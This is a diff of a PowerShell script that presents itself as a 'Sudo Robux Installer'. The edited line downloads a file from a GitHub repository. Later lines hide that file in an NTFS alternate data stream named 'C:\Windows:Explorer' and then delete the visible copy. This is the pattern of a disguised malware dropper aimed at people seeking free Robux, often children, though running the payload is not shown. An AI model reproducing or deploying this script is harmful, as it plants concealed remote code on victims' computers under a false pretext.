@@ -3,7 +3,7 @@ Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
 Write-Host " by Hadron" -ForegroundColor DarkGray
 Write-Host
 Write-Host "Downloading..." -ForegroundColor DarkCyan
-curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe -o russianhuzz
+curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz -o russianhuzz
 Write-Host "Installing..." -ForegroundColor DarkCyan
 cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
 rm .\russianhuzz
